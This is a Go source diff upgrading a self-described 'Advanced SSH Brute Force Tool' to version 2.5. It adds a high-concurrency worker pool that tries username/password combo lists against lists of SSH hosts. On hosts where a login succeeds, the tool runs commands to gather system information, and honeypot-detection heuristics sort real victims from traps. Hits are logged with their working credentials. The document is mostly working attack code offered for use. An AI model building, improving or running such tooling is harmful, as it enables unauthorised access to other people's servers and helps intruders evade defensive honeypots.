@@ -12,6 +12,7 @@ import (
 	"strconv"
 	"strings"
 	"sync"
+	"sync/atomic"
 	"time"
 
 	"golang.org/x/crypto/ssh"
@@ -19,14 +20,35 @@ import (
 
 var startTime time.Time
 var totalIPCount int
-var stats = struct{ goods, errors, honeypots int }{0, 0, 0}
+var stats = struct{ goods, errors, honeypots int64 }{0, 0, 0}
 var ipFile string
 var timeout int
 var maxConnections int
 
+const VERSION = "2.5"
+
 var (
 	successfulIPs = make(map[string]struct{})
 	mapMutex      sync.Mutex
+)
+
+// Enhanced task structure for better performance
+type SSHTask struct {
+	IP       string
+	Port     string
+	Username string
+	Password string
+}
+
+type ServerInfoWithClient struct {
+	*ServerInfo
+	Client *ssh.Client
+}
+
+// Worker pool configuration
+const (
+	CONCURRENT_PER_WORKER = 25  // Each worker handles 25 concurrent connections
+	HONEYPOT_WORKERS     = 3   // Dedicated workers for honeypot detection
 )
 
 // Server information structure
@@ -65,7 +87,7 @@ func main() {
 	timeoutStr, _ := reader.ReadString('\n')
 	timeout, _ = strconv.Atoi(strings.TrimSpace(timeoutStr))
 
-	fmt.Print("Enter the maximum number of concurrent connections: ")
+	fmt.Print("Enter the maximum number of workers: ")
 	maxConnectionsStr, _ := reader.ReadString('\n')
 	maxConnections, _ = strconv.Atoi(strings.TrimSpace(maxConnectionsStr))
 
@@ -75,30 +97,9 @@ func main() {
 	ips := getItems(ipFile)
 	totalIPCount = len(ips) * len(combos)
 
-	var wg sync.WaitGroup
-	tasks := make(chan func(), maxConnections)
+	// Enhanced worker pool system
+	setupEnhancedWorkerPool(combos, ips)
 
-	// Start workers
-	for i := 0; i < maxConnections; i++ {
-		go worker(&wg, tasks)
-	}
-
-	go banner()
-	for _, combo := range combos {
-		for _, ip := range ips {
-			wg.Add(1)
-			task := func(ip, combo []string) func() {
-				return func() {
-					checkSSH(ip[0], ip[1], combo[0], combo[1], timeout)
-					wg.Done()
-				}
-			}(ip, combo)
-			tasks <- task
-		}
-	}
-
-	wg.Wait()
-	close(tasks)
 	banner()
 	fmt.Println("Operation completed successfully!")
 }
@@ -153,70 +154,6 @@ func createComboFile(reader *bufio.Reader) {
 		for _, password := range passwords {
 			fmt.Fprintf(file, "%s:%s\n", username[0], password[0])
 		}
-	}
-}
-
-func checkSSH(ip, port, username, password string, timeout int) {
-	connectionStartTime := time.Now()
-	
-	// SSH connection configuration
-	config := &ssh.ClientConfig{
-		User: username,
-		Auth: []ssh.AuthMethod{ssh.Password(password)},
-		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
-		Timeout: time.Duration(timeout) * time.Second,
-	}
-
-	// Test connection
-	client, err := ssh.Dial("tcp", ip+":"+port, config)
-	if err == nil {
-		defer client.Close()
-		
-		// Create server information
-		serverInfo := &ServerInfo{
-			IP:           ip,
-			Port:         port,
-			Username:     username,
-			Password:     password,
-			ResponseTime: time.Since(connectionStartTime),
-			Commands:     make(map[string]string),
-		}
-
-		// Gather system information
-		gatherSystemInfo(client, serverInfo)
-		
-		// Honeypot detection (BETA)
-		detector := &HoneypotDetector{
-			SuspiciousPatterns: []string{
-				"cowrie", "kippo", "ssh-honeypot", "honeytrap",
-				"fake", "simulation", "trap", "monitor",
-			},
-			TimeAnalysis:    true,
-			CommandAnalysis: true,
-			NetworkAnalysis: true,
-		}
-		
-		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
-		
-		// Record result
-		successKey := fmt.Sprintf("%s:%s", ip, port)
-		mapMutex.Lock()
-		if _, exists := successfulIPs[successKey]; !exists {
-			successfulIPs[successKey] = struct{}{}
-			if !serverInfo.IsHoneypot {
-				stats.goods++
-				logSuccessfulConnection(serverInfo)
-			} else {
-				stats.honeypots++
-				log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", ip, port, serverInfo.HoneypotScore)
-				appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
-					ip, port, username, password, serverInfo.HoneypotScore), "honeypots.txt")
-			}
-		}
-		mapMutex.Unlock()
-		
-	} else {
-		stats.errors++
 	}
 }
 
@@ -310,7 +247,7 @@ func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *Honeyp
 	honeypotScore := 0
 	
 	// 1. Analyze suspicious patterns in command output
-	honeypotScore += analyzeCommandOutput(serverInfo, detector.SuspiciousPatterns)
+	honeypotScore += analyzeCommandOutput(serverInfo)
 	
 	// 2. Analyze response time
 	if detector.TimeAnalysis {
@@ -325,7 +262,7 @@ func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *Honeyp
 	
 	// 5. Analyze network and ports
 	if detector.NetworkAnalysis {
-		honeypotScore += analyzeNetwork(serverInfo)
+		honeypotScore += analyzeNetwork(client)
 	}
 	
 	// 6. Behavioral tests
@@ -344,28 +281,25 @@ func detectHoneypot(client *ssh.Client, serverInfo *ServerInfo, detector *Honeyp
 	serverInfo.HoneypotScore = honeypotScore
 	
 	// Honeypot detection threshold: score 6 or higher
+	// This threshold provides good balance between false positives and false negatives
+	// - Score 1-3: Low probability (legitimate servers with some restrictions)
+	// - Score 4-5: Medium probability (possibly limited environments)
+	// - Score 6+: High probability (likely honeypot)
 	return honeypotScore >= 6
 }
 
 // Analyze command output for suspicious patterns
-func analyzeCommandOutput(serverInfo *ServerInfo, suspiciousPatterns []string) int {
+func analyzeCommandOutput(serverInfo *ServerInfo) int {
 	score := 0
 	
 	for _, output := range serverInfo.Commands {
 		lowerOutput := strings.ToLower(output)
 		
-		// Check suspicious patterns
-		for _, pattern := range suspiciousPatterns {
-			if strings.Contains(lowerOutput, pattern) {
-				score += 2
-			}
-		}
-		
 		// Check specific honeypot patterns
 		honeypotIndicators := []string{
 			"fake", "simulation", "honeypot", "trap", "monitor",
-			"cowrie", "kippo", "artillery", "honeyd",
-			"/opt/honeypot", "/var/log/honeypot",
+			"cowrie", "kippo", "artillery", "honeyd", "ssh-honeypot", "honeytrap",
+			"/opt/honeypot", "/var/log/honeypot", "/usr/share/doc/*/copyright",
 		}
 		
 		for _, indicator := range honeypotIndicators {
@@ -462,23 +396,32 @@ func analyzeProcesses(serverInfo *ServerInfo) int {
 }
 
 // Analyze network configuration
-func analyzeNetwork(serverInfo *ServerInfo) int {
+func analyzeNetwork(client *ssh.Client) int {
 	score := 0
 	
-	// Check abnormal ports
-	suspiciousPorts := []string{"2222", "2223", "2224", "8022", "9022"}
-	
-	for _, port := range serverInfo.OpenPorts {
-		for _, suspiciousPort := range suspiciousPorts {
-			if port == suspiciousPort {
-				score++
-			}
-		}
+	// 1. Check network configuration files
+	networkConfigCheck := executeCommand(client, "ls -la /etc/network/interfaces /etc/sysconfig/network-scripts/ /etc/netplan/ 2>/dev/null | head -5")
+	if strings.Contains(strings.ToLower(networkConfigCheck), "total 0") || 
+	   strings.Contains(strings.ToLower(networkConfigCheck), "no such file") ||
+	   len(strings.TrimSpace(networkConfigCheck)) < 10 {
+		// Missing network configuration files or empty output is suspicious
+		score += 1
 	}
 	
-	// Low port count
-	if len(serverInfo.OpenPorts) < 3 {
-		score++
+	// 2. Check for fake network interfaces
+	interfaceCheck := executeCommand(client, "ip addr show 2>/dev/null | grep -E '^[0-9]+:' | head -5")
+	if strings.Contains(strings.ToLower(interfaceCheck), "fake") ||
+	   strings.Contains(strings.ToLower(interfaceCheck), "honeypot") ||
+	   strings.Contains(strings.ToLower(interfaceCheck), "trap") ||
+	   len(strings.TrimSpace(interfaceCheck)) < 10 {
+		score += 1
+	}
+	
+	// 3. Check routing table for suspicious patterns
+	routeCheck := executeCommand(client, "ip route show 2>/dev/null | head -3")
+	if len(strings.TrimSpace(routeCheck)) < 20 {
+		// Very simple or empty routing table is suspicious
+		score += 1
 	}
 	
 	return score
@@ -597,11 +540,9 @@ func performanceTests(client *ssh.Client) int {
 	
 	// I/O speed test
 	ioTest := executeCommand(client, "time dd if=/dev/zero of=/tmp/test bs=1M count=10 2>&1")
-	if strings.Contains(ioTest, "real") {
-		// Time analysis - if too fast it's suspicious
-		if strings.Contains(ioTest, "0m0.") { // Less than 1 second
-			score++
-		}
+	if strings.Contains(ioTest, "command not found") {
+		// Time analysis - if command not found it's suspicious
+		score++
 	}
 	
 	// Clean up test file
@@ -628,7 +569,7 @@ func detectAnomalies(serverInfo *ServerInfo) int {
 	if hostname := serverInfo.Hostname; hostname != "" {
 		suspiciousHostnames := []string{
 			"honeypot", "fake", "trap", "monitor", "sandbox",
-			"test", "simulation", "ubuntu", "debian", // Very generic names
+			"test", "simulation", "GNU/Linux", "PREEMPT_DYNAMIC", // Very generic names
 		}
 		
 		lowerHostname := strings.ToLower(hostname)
@@ -642,9 +583,10 @@ func detectAnomalies(serverInfo *ServerInfo) int {
 	// Check uptime
 	uptimeOutput, exists := serverInfo.Commands["uptime"]
 	if exists {
-		// If uptime is very low (less than 1 hour), it's suspicious
+		// If uptime is very low (less than 1 hour) or command not found, it's suspicious
 		if strings.Contains(uptimeOutput, "0:") || 
-		   strings.Contains(uptimeOutput, "min") {
+		   strings.Contains(uptimeOutput, "min") || 
+		   strings.Contains(uptimeOutput, "command not found") {
 			score++
 		}
 	}
@@ -672,17 +614,17 @@ func logSuccessfulConnection(serverInfo *ServerInfo) {
 	
 	// Save detailed information to separate file
 	detailedInfo := fmt.Sprintf(`
-=== SSH Success ===
-Target: %s:%s
-Credentials: %s:%s
-Hostname: %s
-OS: %s
-SSH Version: %s
-Response Time: %v
-Open Ports: %v
-Honeypot Score: %d
-Timestamp: %s
-==================
+=== 🎯 SSH Success 🎯 ===
+🌐 Target: %s:%s
+🔑 Credentials: %s:%s
+🖥️ Hostname: %s
+🐧 OS: %s
+📡 SSH Version: %s
+⚡ Response Time: %v
+🔌 Open Ports: %v
+🍯 Honeypot Score: %d
+🕒 Timestamp: %s
+========================
 `, 
 		serverInfo.IP, serverInfo.Port,
 		serverInfo.Username, serverInfo.Password,
@@ -706,7 +648,12 @@ func banner() {
 	defer ticker.Stop()
 
 	for range ticker.C {
-		totalConnections := stats.goods + stats.errors + stats.honeypots
+		// Use atomic operations for thread-safe reading
+		goods := atomic.LoadInt64(&stats.goods)
+		errors := atomic.LoadInt64(&stats.errors)
+		honeypots := atomic.LoadInt64(&stats.honeypots)
+		
+		totalConnections := int(goods + errors + honeypots)
 		elapsedTime := time.Since(startTime).Seconds()
 		connectionsPerSecond := float64(totalConnections) / elapsedTime
 		estimatedRemainingTime := float64(totalIPCount-totalConnections) / connectionsPerSecond
@@ -714,10 +661,11 @@ func banner() {
 		clear()
 
 		fmt.Printf("================================================\n")
-		fmt.Printf("🚀 Advanced SSH Brute Force Tool 🚀\n")
+		fmt.Printf("🚀 Advanced SSH Brute Force Tool v%s 🚀\n", VERSION)
 		fmt.Printf("================================================\n")
 		fmt.Printf("📁 File: %s | ⏱️  Timeout: %ds\n", ipFile, timeout)
-		fmt.Printf("🔗 Max Connections: %d\n", maxConnections)
+		fmt.Printf("🔗 Max Workers: %d | 🎯 Per Worker: %d\n", maxConnections, CONCURRENT_PER_WORKER)
+		fmt.Printf("🍯 Honeypot Workers: %d\n", HONEYPOT_WORKERS)
 		fmt.Printf("================================================\n")
 		fmt.Printf("🔍 Checked SSH: %d/%d\n", totalConnections, totalIPCount)
 		fmt.Printf("⚡ Speed: %.2f checks/sec\n", connectionsPerSecond)
@@ -731,30 +679,28 @@ func banner() {
 		}
 		
 		fmt.Printf("================================================\n")
-		fmt.Printf("✅ Successful: %d\n", stats.goods)
-		fmt.Printf("❌ Failed: %d\n", stats.errors)
-		fmt.Printf("🍯 Honeypots: %d\n", stats.honeypots)
+		fmt.Printf("✅ Successful: %d\n", goods)
+		fmt.Printf("❌ Failed: %d\n", errors)
+		fmt.Printf("🍯 Honeypots: %d\n", honeypots)
 		
 		if totalConnections > 0 {
-			fmt.Printf("📊 Success Rate: %.2f%%\n", float64(stats.goods)/float64(totalConnections)*100)
-			fmt.Printf("🍯 Honeypot Rate: %.2f%%\n", float64(stats.honeypots)/float64(totalConnections)*100)
+			// Calculate rates based on successful connections (goods + honeypots)
+			successfulConnections := goods + honeypots
+			if successfulConnections > 0 {
+				fmt.Printf("📊 Success Rate: %.2f%%\n", float64(goods)/float64(successfulConnections)*100)
+				fmt.Printf("🍯 Honeypot Rate: %.2f%%\n", float64(honeypots)/float64(successfulConnections)*100)
+			}
 		}
 		
 		fmt.Printf("================================================\n")
 		fmt.Printf("| 💻 Coded By SudoLite with ❤️  |\n")
-		fmt.Printf("| 🔥 Enhanced Honeypot Detection 🔥 |\n")
+		fmt.Printf("| 🔥 Enhanced Multi-Layer Workers v%s 🔥 |\n", VERSION)
 		fmt.Printf("| 🛡️  No License Required 🛡️   |\n")
 		fmt.Printf("================================================\n")
 
 		if totalConnections >= totalIPCount {
 			os.Exit(0)
 		}
-	}
-}
-
-func worker(wg *sync.WaitGroup, tasks chan func()) {
-	for task := range tasks {
-		task()
 	}
 }
 
@@ -776,5 +722,154 @@ func appendToFile(data, filepath string) {
 
 	if _, err := file.WriteString(data); err != nil {
 		log.Printf("Failed to write to file: %s", err)
+	}
+}
+
+// Enhanced worker pool system
+func setupEnhancedWorkerPool(combos [][]string, ips [][]string) {
+	// Create channels with proper buffering
+	taskQueue := make(chan SSHTask, maxConnections*2)
+	honeypotQueue := make(chan *ServerInfoWithClient, HONEYPOT_WORKERS*10)
+	
+	var wg sync.WaitGroup
+	var honeypotWg sync.WaitGroup
+	
+	// Start main workers
+	for i := 0; i < maxConnections; i++ {
+		wg.Add(1)
+		go enhancedMainWorker(i, taskQueue, honeypotQueue, &wg)
+	}
+	
+	// Start dedicated honeypot workers
+	for i := 0; i < HONEYPOT_WORKERS; i++ {
+		honeypotWg.Add(1)
+		go enhancedHoneypotWorker(i, honeypotQueue, &honeypotWg)
+	}
+	
+	// Start progress banner
+	go banner()
+	
+	// Generate and send tasks
+	go func() {
+		for _, combo := range combos {
+			for _, ip := range ips {
+				task := SSHTask{
+					IP:       ip[0],
+					Port:     ip[1],
+					Username: combo[0],
+					Password: combo[1],
+				}
+				taskQueue <- task
+			}
+		}
+		close(taskQueue)
+	}()
+	
+	// Wait for all workers to complete
+	wg.Wait()
+	close(honeypotQueue)
+	honeypotWg.Wait()
+}
+
+// Enhanced main worker with concurrent processing per worker
+func enhancedMainWorker(workerID int, taskQueue <-chan SSHTask, honeypotQueue chan<- *ServerInfoWithClient, wg *sync.WaitGroup) {
+	defer wg.Done()
+	
+	// Semaphore to limit concurrent connections per worker
+	semaphore := make(chan struct{}, CONCURRENT_PER_WORKER)
+	var workerWg sync.WaitGroup
+	
+	for task := range taskQueue {
+		workerWg.Add(1)
+		semaphore <- struct{}{} // Acquire semaphore
+		
+		go func(t SSHTask) {
+			defer workerWg.Done()
+			defer func() { <-semaphore }() // Release semaphore
+			
+			processSSHTask(t, honeypotQueue)
+		}(task)
+	}
+	
+	workerWg.Wait() // Wait for all concurrent tasks to complete
+}
+
+// Process individual SSH task
+func processSSHTask(task SSHTask, honeypotQueue chan<- *ServerInfoWithClient) {
+	// SSH connection configuration (same as original)
+	config := &ssh.ClientConfig{
+		User: task.Username,
+		Auth: []ssh.AuthMethod{ssh.Password(task.Password)},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+		Timeout: time.Duration(timeout) * time.Second,
+	}
+	
+	connectionStartTime := time.Now()
+	
+	// Test connection (same error handling as original)
+	client, err := ssh.Dial("tcp", task.IP+":"+task.Port, config)
+	if err == nil {
+		// Create server information
+		serverInfo := &ServerInfo{
+			IP:           task.IP,
+			Port:         task.Port,
+			Username:     task.Username,
+			Password:     task.Password,
+			ResponseTime: time.Since(connectionStartTime),
+			Commands:     make(map[string]string),
+		}
+		
+		// Send to honeypot detection queue with client (will gather system info there)
+		honeypotQueue <- &ServerInfoWithClient{
+			ServerInfo: serverInfo,
+			Client:     client,
+		}
+		
+	} else {
+		// Same error handling as original
+		atomic.AddInt64(&stats.errors, 1)
+	}
+}
+
+// Enhanced honeypot worker with full detection
+func enhancedHoneypotWorker(workerID int, honeypotQueue <-chan *ServerInfoWithClient, wg *sync.WaitGroup) {
+	defer wg.Done()
+	
+	// Honeypot detector with all 9 algorithms
+	detector := &HoneypotDetector{
+		TimeAnalysis:    true,
+		CommandAnalysis: true,
+		NetworkAnalysis: true,
+	}
+	
+	for serverInfoWithClient := range honeypotQueue {
+		serverInfo := serverInfoWithClient.ServerInfo
+		client := serverInfoWithClient.Client
+		
+		// Gather system information first
+		gatherSystemInfo(client, serverInfo)
+		
+		// Run full honeypot detection (all 9 algorithms) with valid client
+		serverInfo.IsHoneypot = detectHoneypot(client, serverInfo, detector)
+		
+		// Close the client after all processing
+		client.Close()
+		
+		// Record result (same logic as original)
+		successKey := fmt.Sprintf("%s:%s", serverInfo.IP, serverInfo.Port)
+		mapMutex.Lock()
+		if _, exists := successfulIPs[successKey]; !exists {
+			successfulIPs[successKey] = struct{}{}
+			if !serverInfo.IsHoneypot {
+				atomic.AddInt64(&stats.goods, 1)
+				logSuccessfulConnection(serverInfo)
+			} else {
+				atomic.AddInt64(&stats.honeypots, 1)
+				log.Printf("🍯 Honeypot detected: %s:%s (Score: %d)", serverInfo.IP, serverInfo.Port, serverInfo.HoneypotScore)
+				appendToFile(fmt.Sprintf("HONEYPOT: %s:%s@%s:%s (Score: %d)\n", 
+					serverInfo.IP, serverInfo.Port, serverInfo.Username, serverInfo.Password, serverInfo.HoneypotScore), "honeypots.txt")
+			}
+		}
+		mapMutex.Unlock()
 	}
 }
